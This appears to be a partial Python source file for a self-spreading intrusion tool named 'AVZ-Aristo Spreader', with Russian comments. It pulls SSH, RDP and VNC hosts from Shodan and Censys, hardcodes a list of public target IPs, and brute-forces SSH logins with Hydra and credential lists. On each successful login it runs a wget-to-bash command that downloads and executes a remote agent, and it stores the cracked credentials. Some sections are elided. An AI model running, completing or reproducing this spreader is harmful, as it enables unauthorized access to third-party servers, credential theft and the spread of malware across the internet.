#!/usr/bin/env python3
# AVZ-Aristo Spreader v28.0 - Targeted, Multi-Threaded, Intelligent
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, shutil, tempfile
from datetime import datetime, timezone, timedelta

# ... (остальные импорты без изменений)

# === НОВЫЙ МОДУЛЬ: ПОЛУЧЕНИЕ ЦЕЛЕЙ ===
async def fetch_high_value_targets(limit=200):
    """
    Получает список IP-адресов только для серверов/VPS с открытыми портами 22, 3389, 5900.
    Использует Shodan и Censys API (если ключи предоставлены).
    """
    targets = []
    # 1. Попытка получить цели через Censys (если есть API-ключ)
    try:
        with open("secrets.json") as f:
            s = json.load(f)
            censys_id = s.get("censys_api_id")
            censys_secret = s.get("censys_secret")
        if censys_id and censys_secret:
            url = "https://search.censys.io/api/v2/hosts/search"
            query = "services.service_name: SSH or RDP or VNC"
            data = {"query": query, "per_page": limit}
            resp = requests.post(url, json=data, auth=(censys_id, censys_secret), timeout=10)
            if resp.status_code == 200:
                targets.extend([h['ip'] for h in resp.json().get('result', {}).get('hits', [])])
                print(f"[{now_str()}] [INFO] Censys: получено {len(targets)} целей", flush=True)
    except Exception as e:
        print(f"[{now_str()}] [WARN] Censys API error: {e}", flush=True)

    # 2. Попытка получить цели через Shodan (если есть API-ключ)
    if not targets:
        try:
            with open("secrets.json") as f:
                s = json.load(f)
                shodan_key = s.get("shodan_api_key")
            if shodan_key:
                url = f"https://api.shodan.io/shodan/host/search?key={shodan_key}&query=port:22,3389,5900&limit={limit}"
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    targets.extend([m['ip_str'] for m in resp.json().get('matches', [])])
                    print(f"[{now_str()}] [INFO] Shodan: получено {len(targets)} целей", flush=True)
        except Exception as e:
            print(f"[{now_str()}] [WARN] Shodan API error: {e}", flush=True)

    # 3. Fallback: Использование бесплатного Shodan InternetDB для проверки гарантированных IP
    if not targets:
        print(f"[{now_str()}] [INFO] Использую Shodan InternetDB для проверки гарантированных целей...", flush=True)
        for ip in GUARANTEED_IPS[:50]:
            try:
                resp = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=3)
                if resp.status_code == 200 and resp.json().get('ports'):
                    targets.append(ip)
            except:
                pass
        print(f"[{now_str()}] [INFO] Shodan InternetDB: подтверждено {len(targets)} целей", flush=True)

    return targets

# === ГЛОБАЛЬНЫЙ ПУЛ ЦЕЛЕЙ ===
GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0"
]
random.shuffle(GUARANTEED_IPS)

# === ГЛОБАЛЬНЫЙ ПУЛ ЦЕЛЕЙ ===
def random_ip():
    # 80% из пула высокоприоритетных целей, 20% из гарантированных
    if hasattr(random_ip, "high_value_pool") and random_ip.high_value_pool and random.random() < 0.8:
        return random.choice(random_ip.high_value_pool)
    if random.random() < 0.8:
        return random.choice(GUARANTEED_IPS)
    # ... (остальная логика случайной генерации IP)

async def ssh_brute_hydra(ip):
    """
    Использует Hydra для быстрого многопоточного брутфорса SSH.
    Если Hydra недоступна, откатывается к sshpass.
    """
    if not shutil.which("hydra"):
        print(f"[{now_str()}] [WARN] Hydra не найдена. Использую sshpass.", flush=True)
        return await ssh_brute_sshpass(ip)

    # Загрузка расширенных словарей
    users = set()
    passwords = set()
    # Загрузка из внешних словарей (если есть)
    for fname in ["users.txt", "pass.txt"]:
        if os.path.exists(fname):
            with open(fname) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        if fname == "users.txt":
                            users.add(line)
                        else:
                            passwords.add(line)

    # Добавляем базовые креды
    for u, p in CREDS + SUCCESS_CREDS:
        users.add(u)
        passwords.add(p)

    # Создаем временные файлы для Hydra
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as uf:
        uf.write('\n'.join(users))
        users_file = uf.name
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as pf:
        pf.write('\n'.join(passwords))
        pass_file = pf.name

    try:
        # Запуск Hydra с 16 потоками
        cmd = f"hydra -L {users_file} -P {pass_file} -t 16 -f -o /tmp/hydra_{ip}.txt ssh://{ip}"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
        await asyncio.wait_for(proc.communicate(), timeout=15)  # Таймаут 15 секунд
        if os.path.exists(f"/tmp/hydra_{ip}.txt"):
            with open(f"/tmp/hydra_{ip}.txt") as f:
                for line in f:
                    if "login:" in line and "password:" in line:
                        parts = line.split()
                        u = parts[4] if len(parts) > 4 else ""
                        p = parts[6] if len(parts) > 6 else ""
                        if u and p:
                            # Попытка загрузки агента
                            cmd2 = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
                            proc2 = await asyncio.create_subprocess_shell(cmd2)
                            await asyncio.wait_for(proc2.communicate(), timeout=5)
                            if proc2.returncode == 0:
                                save_success_creds(u, p)
                                return True
    except Exception as e:
        print(f"[{now_str()}] [ERROR] Hydra {ip}: {e}", flush=True)
    finally:
        os.unlink(users_file)
        os.unlink(pass_file)
    return False

# ... (остальной код векторов и сканирования)
